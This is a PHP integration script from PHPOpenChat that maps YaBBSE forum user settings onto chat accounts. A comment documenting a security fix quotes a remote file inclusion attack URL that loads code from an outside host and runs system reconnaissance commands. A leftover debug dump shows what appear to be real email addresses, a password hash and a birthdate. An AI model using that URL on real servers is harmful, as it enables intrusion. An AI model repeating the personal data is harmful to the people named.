<?php //-*-php-*-
/*   ********************************************************************   **
**   Copyright notice                                                       **
**                                                                          **
**   (c) 1995-2004 PHPOpenChat Development Team                             **
**   http://phpopenchat.sourceforge.net/                                    **
**                                                                          **
**   All rights reserved                                                    **
**                                                                          **
**   This script is part of the PHPOpenChat project. The PHPOpenChat        **
**   project is free software; you can redistribute it and/or modify        **
**   it under the terms of the GNU General Public License as published by   **
**   the Free Software Foundation; either version 2 of the License, or      **
**   (at your option) any later version.                                    **
**                                                                          **
**   The GNU General Public License can be found at                         **
**   http://www.gnu.org/copyleft/gpl.html.                                  **
**   A copy is found in the textfile GPL and important notices to the       **
**   license from the team is found in the textfile LICENSE distributed     **
**   with these scripts.                                                    **
**                                                                          **
**   This script is distributed in the hope that it will be useful,         **
**   but WITHOUT ANY WARRANTY; without even the implied warranty of         **
**   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          **
**   GNU General Public License for more details.                           **
**                                                                          **
**   This copyright notice MUST APPEAR in all copies of the script!         **
**   ********************************************************************   */

/*
  $Author: letreo $
  $Date: 2004/02/24 17:05:18 $
  $Source: /cvsroot/phpopenchat/chat3/contrib/yabbse/Attic/poc.php,v $
  $Revision: 1.1.2.3 $
*/
//quick security fix
//'cause, if register_globals=on and allow_url_fopen=on
//the following is possible:
//http://www.victime.al/phpopenchat/contrib/phpbb/poc.php?phpbb_root_path=http://www.haxorz.al/asc?&cmd=uname%20-a;w;id;pwd;ps
//thx to the Albania Security Clan (Mafia_Boy) 
//for finding the bug and bringing us to the light!
if( !function_exists('version_compare') || version_compare(PHP_VERSION, "4.1.0", "<") )
  die('please update your php installation');

$givenParams = array_keys($_REQUEST);
foreach($givenParams as $param )
  unset(${$param});

include_once("QueryString.php");
include_once("Settings.php");
include_once("$sourcedir/Subs.php");
include_once("$sourcedir/Errors.php");
include_once("$sourcedir/Load.php");
//include_once("$sourcedir/Security.php");

$dbcon = mysql_connect($db_server, $db_user, $db_passwd) or die(mysql_error());
mysql_select_db($db_name) or die(mysql_error());

/* Log this click */
ClickLog();

/* Load the user's cookie (or set to guest) */
LoadCookie();

/* Load user settings */
LoadUserSettings();
LoadUser($username);

//PHPOpenChat properties
/*
supposition is, you have installed YaBBSE and PHPOpenChat within the document root
of your webserver side by side.

<http://your.host.tld>
                      |
                      +</phpbb>
                      |
                      +</phpopenchat>

*/
$poc_doc_root  = '/phpopenchat';
$poc_root_path = './../phpopenchat';

/* print_r($settings);
    [0] => 5cfd676211d58ac0a9127f2db94452cc
    [1] => letreo
    [2] => michael@ortelius.de
    [3] => PHPOpenChat
    [4] => http://www.ortelius.de/
    [5] => signatur mit vielen zeilen
    [6] => 0
    [7] => Administrator
    [8] => 8057112
    [9] => coraxialis
    [10] => oertel_michael@yahoo.com
    [11] => Male
    [12] => I&#039;m a llama!
    [13] => blank.gif
    [14] => 1076535989
    [15] => Berlin
    [16] => 1969-03-24
    [17] => 
    [18] => 0
    [19] => 0
    [20] => 3
    [21] => letreo
    [22] => michael_oertel@msn.com
    [23] => english.lng
*/

if( $username != 'Guest' ){
  require_once($poc_root_path.'/config.inc.php');
  require_once(POC_INCLUDE_PATH.'/class.Chatter.inc');
  require_once(POC_INCLUDE_PATH.'/adodb/adodb.inc.php');

  $chatter = &new POC_Chatter();
  $chatter->set_nick($settings[1]);

  $current_chatter = $chatter;//save current
  
  $chatter->set_user($settings[1]);
  $chatter->set_email($settings[2]); //is hidden by default
  //$chatter->set_name($settings['']);
  $chatter->set_homePageURL($settings[4]);
  $chatter->set_icqNumber($settings[8]);
  $chatter->set_motto($settings[12]);
  $chatter->set_aimNickname($settings[9]);
  $chatter->set_yimNickname($settings[10]);
  $chatter->set_interests($settings[5]);
  if( !empty($settings[11]) ) $gender = ($settings[11]=='Male')? 'm':'f';
  $chatter->set_gender($gender);
  unset($gender);
  $chatter->set_birthday($settings[16]);

  $chatter->set_theme( 'openchat' );//use default theme of PHPOpenChat

  if( $settings[7] == 'Administrator' ){
    $chatter->add_to_group('operator');
  }

  if( !empty($settings[23]) ){
    $chatter->set_preferred_language($settings[23]);
  }

  //do not send registration mails
  $chatter->set_skip_email();
  
  if( $current_chatter != $chatter ){
    if( !$chatter->is_registered()) {
      $chatter->register();
    } else {
      $chatter->update();
    }
  }
  unset($current_chatter);
  
  $chatter->mkinstance_persist();
  unset($chatter);

  header('Status: 301');
  header('Location: http://www.your-host.tld'.$poc_doc_root.'/index.php?use_db_instance='.$settings[1]);
  exit;
}else{
  die('No guest login possible to the chat!');
}

?>
